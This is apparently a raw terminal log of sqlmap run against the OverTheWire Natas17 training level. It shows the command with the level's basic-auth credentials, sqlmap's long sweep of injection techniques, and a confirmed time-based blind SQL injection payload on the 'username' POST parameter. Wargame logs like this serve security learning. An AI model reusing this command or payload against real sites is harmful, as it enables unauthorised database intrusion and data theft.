> sqlmap -u "http://natas17.natas.labs.overthewire.org/index.php" --data=username=natas17 --auth-type=basic --auth-cred=natas17:XkEuChE0SbnKBvH1RU7ksIb9uuLmI7sd --dbms=mysql --level=5 --risk=3
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.8#stable}
|_ -| . [.]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:53:10 /2024-04-01/

[18:53:11] [INFO] testing connection to the target URL
[18:53:11] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:53:11] [INFO] testing if the target URL content is stable
[18:53:11] [INFO] target URL content is stable
[18:53:11] [INFO] testing if POST parameter 'username' is dynamic
[18:53:11] [WARNING] POST parameter 'username' does not appear to be dynamic
[18:53:11] [WARNING] heuristic (basic) test shows that POST parameter 'username' might not be injectable
[18:53:12] [INFO] testing for SQL injection on POST parameter 'username'
[18:53:12] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:53:16] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[18:53:23] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[18:53:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:31] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[18:53:35] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:37] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[18:53:40] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[18:53:42] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:53:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
[18:53:42] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
[18:53:42] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
[18:53:43] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
[18:53:43] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:53:46] [INFO] testing 'Generic inline queries'
[18:53:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[18:53:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[18:53:53] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[18:53:56] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:53:59] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[18:54:05] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:09] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[18:54:14] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:18] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:54:23] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[18:54:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[18:54:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[18:54:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[18:54:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[18:54:24] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[18:54:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause'
[18:54:24] [INFO] testing 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)'
[18:54:24] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:54:26] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:54:26] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[18:54:31] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[18:54:35] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[18:54:40] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[18:54:45] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[18:54:49] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[18:54:54] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[18:54:58] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[18:55:03] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:55:08] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:55:12] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:55:17] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:55:22] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[18:55:26] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[18:55:31] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[18:55:36] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[18:55:40] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[18:55:42] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[18:55:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[18:55:46] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[18:55:46] [INFO] testing 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)'
[18:55:46] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[18:55:46] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[18:55:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[18:55:46] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[18:55:46] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (BIGINT UNSIGNED)'
[18:55:46] [INFO] testing 'MySQL >= 5.5 error-based - ORDER BY, GROUP BY clause (EXP)'
[18:55:47] [INFO] testing 'MySQL >= 5.6 error-based - ORDER BY, GROUP BY clause (GTID_SUBSET)'
[18:55:47] [INFO] testing 'MySQL >= 5.7.8 error-based - ORDER BY, GROUP BY clause (JSON_KEYS)'
[18:55:47] [INFO] testing 'MySQL >= 5.0 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[18:55:47] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (EXTRACTVALUE)'
[18:55:47] [INFO] testing 'MySQL >= 5.1 error-based - ORDER BY, GROUP BY clause (UPDATEXML)'
[18:55:47] [INFO] testing 'MySQL >= 4.1 error-based - ORDER BY, GROUP BY clause (FLOOR)'
[18:55:48] [INFO] testing 'MySQL inline queries'
[18:55:48] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[18:55:50] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[18:55:53] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[18:55:55] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[18:55:59] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[18:56:01] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[18:56:05] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:56:15] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[18:56:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[18:56:15] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[18:56:17] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[18:56:19] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[18:56:21] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[18:56:23] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[18:56:24] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[18:56:26] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[18:56:28] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[18:56:30] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[18:56:32] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[18:56:33] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[18:56:35] [INFO] testing 'MySQL UNION query (random number) - 1 to 20 columns'
[18:56:37] [INFO] testing 'MySQL UNION query (NULL) - 21 to 40 columns'
[18:56:39] [INFO] testing 'MySQL UNION query (random number) - 21 to 40 columns'
[18:56:41] [INFO] testing 'MySQL UNION query (NULL) - 41 to 60 columns'
[18:56:43] [INFO] testing 'MySQL UNION query (random number) - 41 to 60 columns'
[18:56:44] [INFO] testing 'MySQL UNION query (NULL) - 61 to 80 columns'
[18:56:46] [INFO] testing 'MySQL UNION query (random number) - 61 to 80 columns'
[18:56:48] [INFO] testing 'MySQL UNION query (NULL) - 81 to 100 columns'
[18:56:50] [INFO] testing 'MySQL UNION query (random number) - 81 to 100 columns'
[18:56:52] [INFO] checking if the injection point on POST parameter 'username' is a false positive
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 2444 HTTP(s) requests:
---
Parameter: username (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=natas17" AND (SELECT 9184 FROM (SELECT(SLEEP(5)))Cocv)-- dlof
---
[18:58:00] [INFO] the back-end DBMS is MySQL
[18:58:00] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
web server operating system: Linux Ubuntu 22.04 (jammy)
web application technology: Apache 2.4.52
back-end DBMS: MySQL >= 5.0.12
[18:58:00] [INFO] fetched data logged to text files under '/home/cookiengineer/.local/share/sqlmap/output/natas17.natas.labs.overthewire.org'

[*] ending @ 18:58:00 /2024-04-01/


